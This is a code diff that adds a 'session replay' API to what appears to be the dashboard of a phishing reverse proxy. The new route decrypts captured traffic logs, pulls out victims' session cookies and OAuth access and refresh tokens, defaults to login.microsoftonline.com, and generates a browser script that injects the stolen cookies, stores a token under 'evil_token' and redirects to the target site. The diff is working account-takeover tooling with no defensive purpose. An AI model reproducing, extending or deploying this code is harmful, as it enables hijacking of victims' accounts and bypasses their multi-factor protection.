@@ -123,6 +123,105 @@ app.get('/api/status', (req, res) => {
     }
 });
 
+// =============================================
+// 🍪 SESSION REPLAY API
+// =============================================
+app.get('/api/replay/:filename', (req, res) => {
+    const filePath = path.join(LOG_DIR, req.params.filename);
+    if (!fs.existsSync(filePath)) return res.status(404).json({ error: 'Log not found' });
+
+    try {
+        const content = fs.readFileSync(filePath, 'utf-8');
+        const lines = content.split('\n').filter(line => line.trim());
+        let allCookies = [];
+        let targetDomain = null;
+        let accessToken = null;
+        let refreshToken = null;
+
+        for (const line of lines) {
+            try {
+                const entry = JSON.parse(line);
+                const iv = Object.keys(entry)[0];
+                const encrypted = entry[iv];
+                const decrypted = decryptData(encrypted, iv);
+                const obj = JSON.parse(decrypted);
+
+                // Extract target domain
+                if (!targetDomain && obj.proxyRequestURL) {
+                    try {
+                        const url = new URL(obj.proxyRequestURL);
+                        targetDomain = url.hostname;
+                    } catch (e) {}
+                }
+
+                // Extract Set-Cookie headers
+                const setCookie = obj.proxyResponseHeaders?.['set-cookie'];
+                if (setCookie) {
+                    const cookieArray = Array.isArray(setCookie) ? setCookie : [setCookie];
+                    for (const cookie of cookieArray) {
+                        const [nameValue] = cookie.split(';');
+                        if (nameValue) allCookies.push(nameValue.trim());
+                    }
+                }
+
+                // Extract OAuth tokens from request body
+                const body = obj.proxyRequestBody;
+                if (body) {
+                    const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+                    const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
+                    const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
+                    if (accessMatch) accessToken = decodeURIComponent(accessMatch[1]);
+                    if (refreshMatch) refreshToken = decodeURIComponent(refreshMatch[1]);
+                }
+            } catch (e) {}
+        }
+
+        if (allCookies.length === 0 && !accessToken) {
+            return res.status(404).json({ error: 'No cookies or tokens found' });
+        }
+
+        // Build replay script
+        const cookieString = allCookies.join('; ');
+        const replayScript = `
+            (function() {
+                const cookies = ${JSON.stringify(allCookies)};
+                const targetDomain = ${JSON.stringify(targetDomain || 'login.microsoftonline.com')};
+                const accessToken = ${JSON.stringify(accessToken)};
+                const refreshToken = ${JSON.stringify(refreshToken)};
+                
+                // Inject cookies
+                cookies.forEach(c => {
+                    document.cookie = c + '; path=/; domain=' + targetDomain + '; Secure; SameSite=None';
+                });
+                
+                let msg = '🍪 ' + cookies.length + ' cookies injected.';
+                if (accessToken) {
+                    msg += '\\n🔑 Access token: ' + accessToken.slice(0, 20) + '...';
+                    localStorage.setItem('evil_token', accessToken);
+                }
+                if (refreshToken) {
+                    msg += '\\n🔄 Refresh token: ' + refreshToken.slice(0, 20) + '...';
+                }
+                alert(msg);
+                window.location.href = 'https://' + targetDomain;
+            })();
+        `;
+
+        res.json({
+            success: true,
+            cookieCount: allCookies.length,
+            targetDomain: targetDomain || 'login.microsoftonline.com',
+            hasAccessToken: !!accessToken,
+            hasRefreshToken: !!refreshToken,
+            replayScript: replayScript,
+            cookieString: cookieString
+        });
+
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+});
+
 // ---------- WebSocket Server for real-time updates ----------
 const server = app.listen(PORT, () => {
     console.log(`📊 Dashboard running on http://localhost:${PORT}`);
